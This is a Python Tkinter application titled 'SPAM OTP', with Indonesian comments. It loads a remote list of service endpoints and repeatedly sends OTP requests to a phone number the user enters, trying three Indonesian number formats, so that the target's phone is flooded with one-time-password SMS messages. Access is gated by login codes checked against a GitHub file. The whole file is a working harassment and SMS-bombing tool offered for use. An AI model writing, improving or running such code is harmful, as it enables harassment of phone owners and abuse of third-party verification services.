import tkinter as tk
from tkinter import messagebox, ttk
import requests
import json
import time
import threading
import os
import socket

# Tema warna Discord
DISCORD_COLORS = {
    "dark_black": "#23272A",
    "dark_grey": "#2C2F33", 
    "grey": "#99AAB5",
    "blurple": "#7289DA",
    "green": "#43B581",
    "red": "#F04747",
    "white": "#FFFFFF"
}

# URL untuk validasi kode login
GITHUB_URL = "https://raw.githubusercontent.com/NAMAGITHUBLY/REPOGITHUBLU/refs/heads/main/FILEGITHUBLU.txt"

# Global variables
is_running = False
send_thread = None

# Fungsi untuk mendapatkan jalur desktop
def get_desktop_path():
    return os.path.join(os.path.expanduser("~"), "Desktop")

# File kode lokal di desktop
LOCAL_CODE_FILE = os.path.join(get_desktop_path(), "sotp.txt")

# Fungsi untuk memvalidasi kode login
def validate_code(code):
    try:
        response = requests.get(GITHUB_URL)
        if response.status_code == 200:
            # Membaca semua kode dari GitHub raw dan memisahkan setiap baris
            github_codes = response.text.strip().splitlines()
            if code in github_codes:
                with open(LOCAL_CODE_FILE, "w") as file:
                    file.write(code)
                return True
            else:
                return False
        else:
            messagebox.showerror("Error", "Gagal memvalidasi kode dari server.")
            return False
    except Exception as e:
        messagebox.showerror("Error", f"Terjadi kesalahan: {str(e)}")
        return False


# Fungsi untuk mengecek apakah kode lokal valid
def is_local_code_valid():
    if os.path.exists(LOCAL_CODE_FILE):
        with open(LOCAL_CODE_FILE, "r") as file:
            local_code = file.read().strip()
        try:
            response = requests.get(GITHUB_URL)
            if response.status_code == 200:
                # Membaca semua kode dari GitHub raw
                github_codes = response.text.strip().splitlines()
                return local_code in github_codes
        except Exception:
            pass
    return False

# Fungsi untuk memeriksa koneksi internet
def check_internet_connection():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        return True
    except (socket.error, socket.timeout):
        return False

# Fungsi untuk menampilkan popup koneksi terputus
def show_connection_popup():
    popup = tk.Toplevel(root)
    popup.title("🌐 Koneksi Internet")
    popup.geometry("300x150")
    popup.configure(bg=DISCORD_COLORS["dark_black"])

    label = tk.Label(
        popup, 
        text="🚫 Koneksi Internet Terputus!\nSilakan periksa koneksi Anda.", 
        bg=DISCORD_COLORS["dark_black"], 
        fg=DISCORD_COLORS["white"],
        font=("Arial", 12)
    )
    label.pack(expand=True, pady=20)

    close_btn = tk.Button(
        popup, 
        text="Tutup 🔒", 
        command=popup.destroy, 
        bg=DISCORD_COLORS["red"], 
        fg=DISCORD_COLORS["white"]
    )
    close_btn.pack(pady=10)

# Fungsi untuk mengambil data dari URL
def fetch_data():
    url = "https://raw.githubusercontent.com/NAMAGITHUBLU/REPOGITHUBLU/refs/heads/main/FILEGITHUBLU.json"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.json()
        else:
            log_message("❌ Gagal mengambil data dari server")
            return []
    except Exception as e:
        log_message(f"❌ Error mengambil data: {str(e)}")
        return []

# Fungsi untuk mengubah format nomor telepon
def format_number(original_number, format_type):
    if format_type == 'initial':
        return '0' + original_number.lstrip('0')
    elif format_type == 'international':
        return '62' + original_number.lstrip('0')
    elif format_type == 'international_plus':
        return '+62' + original_number.lstrip('0')
    return original_number

# Fungsi untuk mengirim permintaan
def send_requests():
    global is_running, send_thread
    
    target_number = entry_number.get().strip()
    
    formatted_numbers = [
        format_number(target_number, 'initial'),
        format_number(target_number, 'international'),
        format_number(target_number, 'international_plus')
    ]

    try:
        while is_running:
            for number in formatted_numbers:
                if not is_running:
                    break

                for service in services:
                    if not is_running:
                        break

                    service_data = {
                        "url": service["url"],
                        "data": json.loads(service["data"].replace("target_number", number)),
                        "headers": service["headers"]
                    }
                    
                    try:
                        response = requests.post(
                            service_data["url"], 
                            headers=service_data["headers"], 
                            json=service_data["data"],
                            timeout=10
                        )
                        
                        if response.status_code == 200:
                            log_message(f"✅ OTP {service['name']} Berhasil dikirim ke {number}")
                        else:
                            log_message(f"❎ OTP {service['name']} Gagal dikirim ke {number}")
                    
                    except requests.RequestException as e:
                        log_message(f"❎ Error saat mengirim ke {service['name']} untuk nomor {number}: {str(e)}")
                
                # Sleep dengan pengecekan is_running
                for _ in range(10):
                    if not is_running:
                        break
                    time.sleep(0.1)
    
    except Exception as e:
        log_message(f"🚨 Kesalahan utama: {str(e)}")
    
    finally:
        is_running = False
        log_message("🛑 Pengiriman dihentikan.")
        root.after(0, update_button_state)

# Fungsi untuk memulai pengiriman
def start_sending():
    global is_running, send_thread
    
    if not check_internet_connection():
        show_connection_popup()
        return

    # Cek apakah thread sudah berjalan
    if send_thread and send_thread.is_alive():
        messagebox.showwarning("⚠️ Peringatan", "Proses pengiriman sudah berjalan!")
        return

    # Validasi nomor telepon
    if not entry_number.get().strip():
        messagebox.showerror("Kesalahan", "Masukkan nomor telepon terlebih dahulu!")
        return

    # Aktifkan flag dan update tombol
    is_running = True
    start_button.config(state=tk.DISABLED)
    stop_button.config(state=tk.NORMAL)

    log_message("🚀 Pengiriman dimulai...")
    send_thread = threading.Thread(target=send_requests)
    send_thread.daemon = True
    send_thread.start()

# Fungsi untuk menghentikan pengiriman
def stop_sending():
    global is_running, send_thread
    is_running = False
    log_message("🛑 Menghentikan pengiriman...")

    # Tunggu sebentar sampai thread berhenti
    if send_thread:
        send_thread.join(timeout=2)

# Fungsi untuk update state tombol
def update_button_state():
    start_button.config(state=tk.NORMAL)
    stop_button.config(state=tk.DISABLED)

# Fungsi untuk menampilkan log pesan di area log
def log_message(message):
    log_text.config(state=tk.NORMAL)
    log_text.insert(tk.END, message + '\n')
    log_text.yview(tk.END)
    log_text.config(state=tk.DISABLED)

# Fungsi untuk menampilkan halaman utama
def show_main_gui():
    login_frame.pack_forget()
    main_frame.pack(fill="both", expand=True)

# Fungsi untuk login
def login():
    if not check_internet_connection():
        show_connection_popup()
        return

    code = entry_code.get().strip()
    if validate_code(code):
        messagebox.showinfo("Berhasil 🎉", "✅ Kode valid. Masuk ke aplikasi.")
        show_main_gui()
    else:
        messagebox.showerror("Gagal 😔", "❌ Kode tidak sesuai.")

# Fungsi untuk styling modern dengan ttk
def create_modern_style():
    style = ttk.Style()
    style.theme_use('clam')
    style.configure("TButton", 
        background=DISCORD_COLORS["blurple"], 
        foreground=DISCORD_COLORS["white"],
        font=('Arial', 10, 'bold')
    )
    style.map('TButton', 
        background=[('active', DISCORD_COLORS["green"])]
    )

# Mendapatkan data dari URL
services = fetch_data()

# Membuat jendela utama
root = tk.Tk()
root.title("🔔 SPAM OTP")
root.geometry("550x500")
root.configure(bg=DISCORD_COLORS["dark_black"])

# Tambahkan logo atau judul dengan emoji
title_label = tk.Label(
    root, 
    text="🚨 SPAM OTP 🚨", 
    bg=DISCORD_COLORS["dark_black"], 
    fg=DISCORD_COLORS["white"], 
    font=("Arial", 16, "bold")
)
title_label.pack(pady=10)

# Frame untuk login
login_frame = tk.Frame(root, bg=DISCORD_COLORS["dark_black"])

label_code = tk.Label(login_frame, text="🔐 Masukkan Kode Login:", bg=DISCORD_COLORS["dark_black"], fg=DISCORD_COLORS["white"])
label_code.pack(pady=10)

entry_code = tk.Entry(login_frame, bg=DISCORD_COLORS["grey"], fg=DISCORD_COLORS["white"])
entry_code.pack(pady=10)

login_button = tk.Button(login_frame, text="✅ Login", command=login, bg=DISCORD_COLORS["blurple"], fg=DISCORD_COLORS["white"])
login_button.pack(pady=20)

# Frame untuk halaman utama
main_frame = tk.Frame(root, bg=DISCORD_COLORS["dark_black"])

label_number = tk.Label(main_frame, text="📜 Masukkan Nomor Telepon:\n(8********)", bg=DISCORD_COLORS["dark_black"], fg=DISCORD_COLORS["white"])
label_number.pack(pady=10)

entry_number = tk.Entry(main_frame, bg=DISCORD_COLORS["grey"], fg=DISCORD_COLORS["white"])
entry_number.pack(pady=10)

start_button = tk.Button(main_frame, text="🚀 KIRIM", command=start_sending, bg=DISCORD_COLORS["green"], fg=DISCORD_COLORS["white"])
start_button.pack(pady=10)

stop_button = tk.Button(main_frame, text="🚫 STOP", command=stop_sending, bg=DISCORD_COLORS["red"], fg=DISCORD_COLORS["white"], state=tk.DISABLED)
stop_button.pack(pady=10)

# Text area untuk log pesan
log_text = tk.Text(main_frame, height=10, width=50, wrap=tk.WORD, state=tk.DISABLED, bg=DISCORD_COLORS["dark_grey"], fg=DISCORD_COLORS["white"])
log_text.pack(pady=10)

# Menambahkan footer
footer_label = tk.Label(
    main_frame, 
    text="Creator by Yosepwdd", 
    bg=DISCORD_COLORS["dark_black"], 
    fg=DISCORD_COLORS["grey"], 
    font=("Arial", 10)
)
footer_label.pack(side=tk.BOTTOM, pady=10)

# Mengecek validitas kode lokal
if is_local_code_valid():
    show_main_gui()
else:
    login_frame.pack(fill="both", expand=True)

# Aktifkan styling modern
create_modern_style()

# Menjalankan aplikasi
root.mainloop()
